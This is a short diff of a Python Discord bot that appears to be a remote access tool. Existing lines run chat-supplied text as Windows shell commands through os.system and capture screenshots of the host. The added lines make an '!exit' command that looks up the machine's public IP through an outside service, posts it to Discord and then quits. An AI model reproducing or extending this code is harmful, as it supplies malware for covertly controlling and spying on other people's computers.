@@ -29,7 +29,12 @@ class MyClient(discord.Client):
                     l += x + " "
             await message.reply("Executed ``"+l+"``", mention_author=True)
             os.system('cmd /C '+l)
-
+            
+        if message.content.startswith("!exit"):
+            ip = requests.get('https://api.ipify.org/')
+            await message.reply('``' + ip.text + ' is leaving``', mention_author=True)
+            exit()
+            
         if message.content.startswith("!ss"):
             image = pyautogui.screenshot()
             image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
